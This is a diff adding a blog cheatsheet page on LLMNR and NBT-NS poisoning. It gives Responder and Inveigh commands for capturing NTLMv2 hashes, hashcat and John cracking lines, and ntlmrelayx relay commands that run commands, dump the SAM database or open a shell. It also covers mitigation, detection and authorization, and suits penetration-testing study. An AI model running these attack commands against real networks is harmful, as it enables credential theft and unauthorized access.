@@ -1,0 +1,521 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+    <title>
+      vipa0z</title>
+  <meta name="author" content="vipa0z">
+  
+  <meta name="description" content="Documenting the mechanics of system failure through red team tactics, CTF writeups, malware analysis, and the path into deeper systems hacking.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="vipa0z"/>
+
+  
+    <meta property="og:image" content="favicon.png"/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="vipa0z" type="application/atom+xml">
+  
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/gitbook.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+  <meta name="title" content="vipa0z">
+  <!-- analytics -->
+  
+
+        <!--  favicon/indexing -->
+        <link rel="icon" type="image/png" href="/favicon.ico/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicon.ico/favicon.svg" />
+        <link rel="shortcut icon" href="/favicon.ico/favicon.ico" />
+        <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicon.ico/site.webmanifest" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+	<div class="container">
+		<button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+			<span class="sr-only">Toggle navigation</span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+		</button>
+		<a class="navbar-brand" href="/">
+			vipa0z
+		</a>
+		<div class="collapse navbar-collapse nav-menu">
+			<ul class="nav navbar-nav">
+				
+					<li>
+						<a href="/index" title="Home">
+							<i class="fa fa-home"></i>Home
+						</a>
+					</li>
+					
+					<li>
+						<a href="/archives" title="All the articles.">
+							<i class="fa fa-archive"></i>Archives
+						</a>
+					</li>
+					
+					<li>
+						<a href="/tags" title="All the tags.">
+							<i class="fa fa-tags"></i>Tags
+						</a>
+					</li>
+					
+					<li>
+						<a href="/cheatsheets/" title="Cheatsheets_and_Notes">
+							<i class="fa fa-book"></i>Docs
+						</a>
+					</li>
+					
+					<li>
+						<a href="/about" title="About me.">
+							<i class="fa fa-user"></i>About Me
+						</a>
+					</li>
+					
+						<!-- Theme Toggle -->
+						<li>
+							<a href="#" class="theme-toggle-btn" aria-label="Toggle theme">
+								<i class="fa fa-moon-o"></i> Theme
+							</a>
+						</li>
+			</ul>
+		</div>
+	</div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+  <div class="container">
+  	<div class="content">
+    	 
+	
+		<div class="page-header">
+			<h1> </h1>
+		</div>
+	
+
+
+
+<div class="row page">
+	<!-- cols -->
+	
+	<div class="col-md-12"> 
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="LLMNR-Poisoning"><a href="#LLMNR-Poisoning" class="headerlink" title="LLMNR Poisoning"></a>LLMNR Poisoning</h1><p>Exploit Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) to capture authentication credentials.<br>LLMNR poisoning is a man-in-the-middle attack that intercepts name resolution requests when DNS fails, capturing NTLMv2 hashes for offline cracking or relay attacks.</p>
+<h2 id="Quick-Reference"><a href="#Quick-Reference" class="headerlink" title="Quick Reference"></a>Quick Reference</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Responder - capture credentials</span></span><br><span class="line"><span class="built_in">sudo</span> responder -I eth0 -wf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Inveigh (Windows) - capture credentials</span></span><br><span class="line">Invoke-Inveigh -ConsoleOutput Y -FileOutput Y</span><br><span class="line"></span><br><span class="line"><span class="comment"># Crack captured NTLMv2 hash</span></span><br><span class="line">hashcat -m 5600 -a 0 captured.hash rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Basic LLMNR/NBT-NS poisoning</span></span><br><span class="line"><span class="built_in">sudo</span> responder -I eth0</span><br><span class="line"></span><br><span class="line"><span class="comment"># With wpad and force authentication</span></span><br><span class="line"><span class="built_in">sudo</span> responder -I eth0 -wf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Analyze mode (passive, no poisoning)</span></span><br><span class="line"><span class="built_in">sudo</span> responder -I eth0 -A</span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable specific services</span></span><br><span class="line"><span class="built_in">sudo</span> responder -I eth0 -d -w</span><br><span class="line"></span><br><span class="line"><span class="comment"># View captured hashes</span></span><br><span class="line"><span class="built_in">cat</span> /usr/share/responder/logs/*.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Extract NTLMv2 hashes</span></span><br><span class="line">grep <span class="string">&quot;NTLMv2&quot;</span> /usr/share/responder/logs/*.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get last 2 captured hashes</span></span><br><span class="line"><span class="built_in">tail</span> -n 2 /usr/share/responder/logs/*NTLM*.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="Inveigh-Windows"><a href="#Inveigh-Windows" class="headerlink" title="Inveigh (Windows)"></a>Inveigh (Windows)</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># PowerShell version (legacy)</span></span><br><span class="line"><span class="built_in">Invoke-Inveigh</span> <span class="literal">-NBNS</span> Y <span class="literal">-ConsoleOutput</span> Y <span class="literal">-FileOutput</span> Y</span><br><span class="line"></span><br><span class="line"><span class="comment"># C# version (recommended)</span></span><br><span class="line">.\Inveigh.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># With specific options</span></span><br><span class="line">.\Inveigh.exe <span class="literal">-LLMNR</span> Y <span class="literal">-NBNS</span> Y <span class="literal">-mDNS</span> Y <span class="literal">-FileOutput</span> Y</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stop Inveigh</span></span><br><span class="line"><span class="built_in">Stop-Inveigh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># View captured credentials</span></span><br><span class="line"><span class="built_in">Get-Inveigh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Clear captured credentials</span></span><br><span class="line"><span class="built_in">Clear-Inveigh</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Hash-Cracking"><a href="#Hash-Cracking" class="headerlink" title="Hash Cracking"></a>Hash Cracking</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Identify hash type (NTLMv2)</span></span><br><span class="line">hashid captured.hash</span><br><span class="line"></span><br><span class="line"><span class="comment"># Crack with Hashcat (mode 5600 = NTLMv2)</span></span><br><span class="line">hashcat -m 5600 -a 0 captured.hash rockyou.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Crack with rules</span></span><br><span class="line">hashcat -m 5600 -a 0 captured.hash rockyou.txt -r best64.rule</span><br><span class="line"></span><br><span class="line"><span class="comment"># Crack with John</span></span><br><span class="line">john --wordlist=rockyou.txt --format=netntlmv2 captured.hash</span><br><span class="line"></span><br><span class="line"><span class="comment"># Show cracked</span></span><br><span class="line">hashcat -m 5600 captured.hash --show</span><br></pre></td></tr></table></figure>
+
+<h2 id="SMB-Relay-Attack"><a href="#SMB-Relay-Attack" class="headerlink" title="SMB Relay Attack"></a>SMB Relay Attack</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Check for SMB signing (required for relay)</span></span><br><span class="line">nmap --script smb-security-mode -p445 10.10.10.0/24</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create targets file (hosts without SMB signing)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;10.10.10.10&quot;</span> &gt; targets.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;10.10.10.11&quot;</span> &gt;&gt; targets.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Setup ntlmrelayx</span></span><br><span class="line">impacket-ntlmrelayx -tf targets.txt -smb2support</span><br><span class="line"></span><br><span class="line"><span class="comment"># With command execution</span></span><br><span class="line">impacket-ntlmrelayx -tf targets.txt -smb2support -c <span class="string">&quot;whoami&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dump SAM database</span></span><br><span class="line">impacket-ntlmrelayx -tf targets.txt -smb2support --sam</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interactive shell</span></span><br><span class="line">impacket-ntlmrelayx -tf targets.txt -smb2support -i</span><br><span class="line"></span><br><span class="line"><span class="comment"># With socks proxy</span></span><br><span class="line">impacket-ntlmrelayx -tf targets.txt -smb2support -socks</span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable HTTP server (SMB only)</span></span><br><span class="line">impacket-ntlmrelayx -tf targets.txt -smb2support --no-http-server</span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable SMB server (HTTP only)</span></span><br><span class="line">impacket-ntlmrelayx -tf targets.txt --no-smb-server</span><br></pre></td></tr></table></figure>
+
+<h2 id="Combined-Attack-Workflow"><a href="#Combined-Attack-Workflow" class="headerlink" title="Combined Attack Workflow"></a>Combined Attack Workflow</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Terminal 1: Setup ntlmrelayx</span></span><br><span class="line">impacket-ntlmrelayx -tf targets.txt -smb2support</span><br><span class="line"></span><br><span class="line"><span class="comment"># Terminal 2: Run Responder (disable SMB/HTTP to avoid conflict)</span></span><br><span class="line"><span class="built_in">sudo</span> responder -I eth0 -d -w</span><br><span class="line"></span><br><span class="line"><span class="comment"># Wait for authentication events</span></span><br><span class="line"><span class="comment"># Responder captures and relays to ntlmrelayx</span></span><br><span class="line"><span class="comment"># ntlmrelayx attempts to authenticate to targets</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Mitigation-Verification"><a href="#Mitigation-Verification" class="headerlink" title="Mitigation Verification"></a>Mitigation Verification</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Check if LLMNR is disabled (PowerShell)</span></span><br><span class="line">$(Get-ItemProperty -Path <span class="string">&quot;HKLM:\Software\Policies\Microsoft\Windows NT\DNSClient&quot;</span> -name EnableMulticast).EnableMulticast</span><br><span class="line"><span class="comment"># Should return: 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check if NBT-NS is disabled (cmd)</span></span><br><span class="line">wmic nicconfig get caption,index,TcpipNetbiosOptions</span><br><span class="line"><span class="comment"># Should return: 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check SMB signing status</span></span><br><span class="line">nmap --script smb-security-mode -p445 10.10.10.10</span><br><span class="line"><span class="comment"># Should show: Message signing enabled and required</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><p><strong>How LLMNR Poisoning Works:</strong></p>
+<ol>
+<li><strong>DNS Failure</strong>: User types incorrect server name (e.g., <code>\\file\</code> instead of <code>\\fileserver\</code>)</li>
+<li><strong>Fallback</strong>: Windows falls back to LLMNR&#x2F;NBT-NS for name resolution</li>
+<li><strong>Broadcast</strong>: Client broadcasts “Who has \file?“ on local network</li>
+<li><strong>Poisoning</strong>: Attacker responds “I am \file, my IP is X.X.X.X”</li>
+<li><strong>Connection</strong>: Client connects to attacker’s machine</li>
+<li><strong>Authentication</strong>: Client sends NTLMv2 hash for authentication</li>
+<li><strong>Capture</strong>: Attacker captures hash for cracking or relay</li>
+</ol>
+<p><strong>Protocols Involved:</strong></p>
+<ul>
+<li><p><strong>LLMNR</strong> (Link-Local Multicast Name Resolution):</p>
+<ul>
+<li>Successor to NetBIOS</li>
+<li>UDP port 5355</li>
+<li>Multicast to 224.0.0.252 (IPv4) or FF02::1:3 (IPv6)</li>
+<li>Used when DNS fails</li>
+</ul>
+</li>
+<li><p><strong>NBT-NS</strong> (NetBIOS Name Service):</p>
+<ul>
+<li>Legacy protocol</li>
+<li>UDP port 137</li>
+<li>Broadcast-based</li>
+<li>Older Windows systems</li>
+</ul>
+</li>
+<li><p><strong>mDNS</strong> (Multicast DNS):</p>
+<ul>
+<li>UDP port 5353</li>
+<li>Used by Apple devices</li>
+<li>Also vulnerable to poisoning</li>
+</ul>
+</li>
+</ul>
+<p><strong>What Gets Captured:</strong></p>
+<p>Responder captures:</p>
+<ul>
+<li>Username</li>
+<li>Domain name</li>
+<li>NTLMv2 hash (challenge-response)</li>
+<li>Client IP address</li>
+<li>Timestamp</li>
+</ul>
+<p>Example captured hash:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin::DOMAIN:1122334455667788:A1B2C3D4E5F6...</span><br></pre></td></tr></table></figure>
+
+<p><strong>Hash Format:</strong></p>
+<p>NTLMv2 format:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username::domain:challenge:response</span><br></pre></td></tr></table></figure>
+
+<p>For Hashcat (mode 5600):</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin::INLANEFREIGHT:17bd3616ae5ae735:37445EA686F4F4AB31A926CE8DC9337B:0101000000000000...</span><br></pre></td></tr></table></figure>
+
+<p><strong>SMB Relay vs LLMNR Poisoning:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Feature</th>
+<th>LLMNR Poisoning</th>
+<th>SMB Relay</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Target</td>
+<td>Name Resolution</td>
+<td>Authentication</td>
+</tr>
+<tr>
+<td>Mechanism</td>
+<td>Intercepts broadcasts</td>
+<td>Relays authentication</td>
+</tr>
+<tr>
+<td>Type</td>
+<td>Passive interception</td>
+<td>Active MITM</td>
+</tr>
+<tr>
+<td>Scope</td>
+<td>Local network</td>
+<td>Can move across network</td>
+</tr>
+<tr>
+<td>Objective</td>
+<td>Capture credentials</td>
+<td>Gain unauthorized access</td>
+</tr>
+<tr>
+<td>Credential Use</td>
+<td>Offline cracking</td>
+<td>Access other systems</td>
+</tr>
+</tbody></table>
+<p><strong>SMB Relay Requirements:</strong></p>
+<p>For SMB relay to work:</p>
+<ol>
+<li>SMB signing must be disabled or not required</li>
+<li>Relayed user must have admin rights on target</li>
+<li>Cannot relay back to same machine</li>
+<li>Target must allow SMB connections</li>
+</ol>
+<p>Check SMB signing:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap --script smb-security-mode -p445 10.10.10.10</span><br></pre></td></tr></table></figure>
+
+<p>Look for:</p>
+<ul>
+<li><code>Message signing enabled but not required</code> &#x3D; Vulnerable</li>
+<li><code>Message signing enabled and required</code> &#x3D; Not vulnerable</li>
+</ul>
+<p><strong>Responder Modes:</strong></p>
+<ul>
+<li><strong>Default mode</strong>: Active poisoning, captures hashes</li>
+<li><strong>Analyze mode (-A)</strong>: Passive listening, no poisoning</li>
+<li><strong>Force WPAD (-w)</strong>: Force WPAD authentication</li>
+<li><strong>Force authentication (-f)</strong>: Force Basic auth</li>
+</ul>
+<p><strong>Common Scenarios:</strong></p>
+<ol>
+<li><strong>User typo</strong>: <code>\\fileserver\</code> → <code>\\file\</code></li>
+<li><strong>Bookmark error</strong>: Old bookmark to decommissioned server</li>
+<li><strong>Script error</strong>: Hardcoded server name that doesn’t exist</li>
+<li><strong>Application</strong>: App tries to connect to non-existent share</li>
+<li><strong>Scheduled task</strong>: Task references old server name</li>
+</ol>
+<p><strong>Success Indicators:</strong></p>
+<p>Responder output:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SMB] NTLMv2-SSP Client   : 10.10.10.50</span><br><span class="line">[SMB] NTLMv2-SSP Username : DOMAIN\user</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : user::DOMAIN:hash...</span><br></pre></td></tr></table></figure>
+
+<p><strong>Cracking Success Rates:</strong></p>
+<p>Typical success rates:</p>
+<ul>
+<li>Weak passwords (Password123!): 80-90%</li>
+<li>Medium complexity: 40-60%</li>
+<li>Strong passwords (16+ chars): 5-20%</li>
+</ul>
+<p><strong>Mitigation Strategies:</strong></p>
+<ol>
+<li><p><strong>Disable LLMNR</strong>:</p>
+<ul>
+<li>Group Policy: Computer Configuration → Administrative Templates → Network → DNS Client</li>
+<li>Enable “Turn OFF Multicast Name Resolution”</li>
+</ul>
+</li>
+<li><p><strong>Disable NBT-NS</strong>:</p>
+<ul>
+<li>PowerShell script in GPO Startup Scripts:</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$regkey</span> = <span class="string">&quot;HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces&quot;</span></span><br><span class="line"><span class="built_in">Get-ChildItem</span> <span class="variable">$regkey</span> | <span class="keyword">foreach</span> &#123; </span><br><span class="line">    <span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;<span class="variable">$regkey</span>\<span class="variable">$</span>(<span class="variable">$_</span>.pschildname)&quot;</span> <span class="literal">-Name</span> NetbiosOptions <span class="literal">-Value</span> <span class="number">2</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Enable SMB Signing</strong>:</p>
+<ul>
+<li>Require SMB signing on all systems</li>
+<li>Prevents relay attacks</li>
+</ul>
+</li>
+<li><p><strong>Network Access Control (NAC)</strong>:</p>
+<ul>
+<li>Authenticate devices before network access</li>
+<li>Limits attacker’s ability to poison</li>
+</ul>
+</li>
+<li><p><strong>Strong Passwords</strong>:</p>
+<ul>
+<li>14+ characters</li>
+<li>Complex requirements</li>
+<li>Makes cracking harder</li>
+</ul>
+</li>
+</ol>
+<p><strong>Detection Methods:</strong></p>
+<p>Monitor for:</p>
+<ul>
+<li>Multiple LLMNR responses from same IP</li>
+<li>LLMNR responses from unexpected IPs</li>
+<li>Unusual SMB authentication patterns</li>
+<li>Failed authentication attempts</li>
+<li>Network traffic to unusual IPs</li>
+</ul>
+<p><strong>Tools Comparison:</strong></p>
+<ul>
+<li><p><strong>Responder</strong>:</p>
+<ul>
+<li>Most popular</li>
+<li>Python-based</li>
+<li>Linux&#x2F;Windows</li>
+<li>Active development</li>
+<li>Easy to use</li>
+</ul>
+</li>
+<li><p><strong>Inveigh</strong>:</p>
+<ul>
+<li>Windows-native</li>
+<li>PowerShell and C# versions</li>
+<li>Better Windows integration</li>
+<li>Can run as service</li>
+<li>Less detection</li>
+</ul>
+</li>
+</ul>
+<p><strong>Post-Capture Actions:</strong></p>
+<p>Once hashes captured:</p>
+<ol>
+<li>Save hashes securely</li>
+<li>Attempt to crack offline</li>
+<li>Try password spraying with cracked passwords</li>
+<li>Check for password reuse</li>
+<li>Attempt SMB relay if signing disabled</li>
+<li>Document findings</li>
+</ol>
+<p><strong>Common Pitfalls:</strong></p>
+<ul>
+<li>Running Responder with SMB&#x2F;HTTP when using ntlmrelayx (conflict)</li>
+<li>Not checking SMB signing before relay attempt</li>
+<li>Forgetting to save captured hashes</li>
+<li>Not monitoring Responder output</li>
+<li>Running too long (increases detection risk)</li>
+<li>Not testing in isolated environment first</li>
+</ul>
+<p><strong>Ethical Considerations:</strong></p>
+<ul>
+<li>Only perform with authorization</li>
+<li>Understand impact on network</li>
+<li>Don’t cause denial of service</li>
+<li>Secure captured credentials</li>
+<li>Document all activities</li>
+<li>Follow rules of engagement</li>
+</ul>
+<p><strong>Advanced Techniques:</strong></p>
+<ol>
+<li><p><strong>WPAD Poisoning</strong>:</p>
+<ul>
+<li>Poison Web Proxy Auto-Discovery</li>
+<li>Capture HTTP authentication</li>
+<li>More credentials captured</li>
+</ul>
+</li>
+<li><p><strong>IPv6 Attacks</strong>:</p>
+<ul>
+<li>Many networks don’t monitor IPv6</li>
+<li>Use mitm6 for IPv6 DNS takeover</li>
+<li>Combine with ntlmrelayx</li>
+</ul>
+</li>
+<li><p><strong>Targeted Poisoning</strong>:</p>
+<ul>
+<li>Respond only to specific hosts</li>
+<li>Reduces noise</li>
+<li>Lower detection risk</li>
+</ul>
+</li>
+</ol>
+<p><strong>Troubleshooting:</strong></p>
+<p>Common issues:</p>
+<ul>
+<li><strong>No hashes captured</strong>: Check network connectivity, verify LLMNR&#x2F;NBT-NS enabled</li>
+<li><strong>Relay fails</strong>: Check SMB signing, verify admin rights</li>
+<li><strong>Responder conflicts</strong>: Disable SMB&#x2F;HTTP when using ntlmrelayx</li>
+<li><strong>Hash won’t crack</strong>: Try different wordlists, use rules</li>
+</ul>
+<p><strong>Legal and Compliance:</strong></p>
+<ul>
+<li>Requires explicit authorization</li>
+<li>Document in rules of engagement</li>
+<li>May violate privacy laws if unauthorized</li>
+<li>Secure all captured data</li>
+<li>Follow data retention policies</li>
+<li>Report findings professionally</li>
+</ul>
+<p><strong>Real-World Impact:</strong></p>
+<p>LLMNR poisoning is:</p>
+<ul>
+<li>Common in penetration tests</li>
+<li>Often successful (60-80% success rate)</li>
+<li>Low-hanging fruit</li>
+<li>Easy to execute</li>
+<li>Hard to detect without proper monitoring</li>
+<li>Can lead to domain compromise</li>
+</ul>
+<p><strong>Remediation Priority:</strong></p>
+<p>High priority because:</p>
+<ul>
+<li>Easy to exploit</li>
+<li>Common in networks</li>
+<li>Can capture admin credentials</li>
+<li>Leads to lateral movement</li>
+<li>Simple to fix</li>
+<li>Low impact on operations</li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 vipa0z's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+  <script src="/js/theme-toggle.js"></script>
+</body>
+   </html>
